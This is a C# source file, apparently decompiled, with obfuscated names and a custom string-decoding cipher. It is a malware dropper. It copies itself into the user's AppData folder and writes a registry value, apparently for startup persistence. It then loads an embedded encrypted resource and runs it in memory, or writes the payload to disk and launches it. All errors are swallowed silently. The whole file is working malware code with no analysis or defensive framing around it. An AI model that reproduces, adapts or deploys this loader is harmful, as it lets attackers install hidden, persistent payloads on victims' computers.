using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public sealed class B7L32620F
{
	public static Assembly Assembly_0 => Assembly.Load(O8WVQFJBR);

	public static object[] RE4F0OLGO => O;

	public static byte[] O8WVQFJBR => SXM4D7("L.resource");

	public static MethodInfo MethodInfo_0 => Assembly_0.EntryPoint;

	public static void HAP5Y47()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smethod_0("dik=", "BS") + smethod_0("co2BfpGCS4KVgik=", "F");
		string name = smethod_0("eaGUj5SMS2+dlKGQnSk=", "T");
		try
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(smethod_0("fZmQnqGLnI+Gd5ONnJmdmZCehoGTmI6ZoZ2GbZ+cnI+YnoCPnJ2TmZiGfJ+YKQ==", "S"), writable: true);
			registryKey.SetValue(name, text);
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			_ = Assembly_0;
			MethodInfo methodInfo_ = MethodInfo_0;
			methodInfo_.Invoke(null, null);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			try
			{
				FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + smethod_0("co2BfpGCS4KVgik=", "False"), FileMode.Create);
				fileStream.Write(O8WVQFJBR, 0, O8WVQFJBR.Length);
				fileStream.Close();
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + smethod_0("co2BfpGCS4KVgik=", "False"));
				ProjectData.EndApp();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static byte[] SXM4D7(string string_0)
	{
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(string_0);
		byte[] buffer = new byte[(int)(manifestResourceStream.Length - 1L) + 1];
		int count = manifestResourceStream.Read(buffer, 0, (int)manifestResourceStream.Length);
		MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
		return memoryStream.ToArray();
	}

	public static string smethod_0(string ZIXCSJACB, string Z3FFR)
	{
		string @string = default(string);
		try
		{
			@string = Encoding.UTF8.GetString(smethod_1(Convert.FromBase64String(ZIXCSJACB), Encoding.UTF8.GetBytes(Z3FFR)));
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	public static byte[] smethod_1(byte[] byte_0, byte[] N2IFFL)
	{
		int num = byte_0[^1];
		byte[] array = new byte[byte_0.Length - 2 + 1];
		short num2 = 0;
		try
		{
			int num3 = byte_0.Length - 2;
			for (int i = 0; i <= num3; i++)
			{
				if (num2 >= N2IFFL.Length)
				{
					num2 = 0;
				}
				if (i < byte_0.Length - 1)
				{
					array[i] = Convert.ToByte(byte_0[i] - array.Length % N2IFFL.Length - N2IFFL[num2] + num);
					num2 = (short)(num2 + 1);
				}
			}
			return array;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			byte[] result = array;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
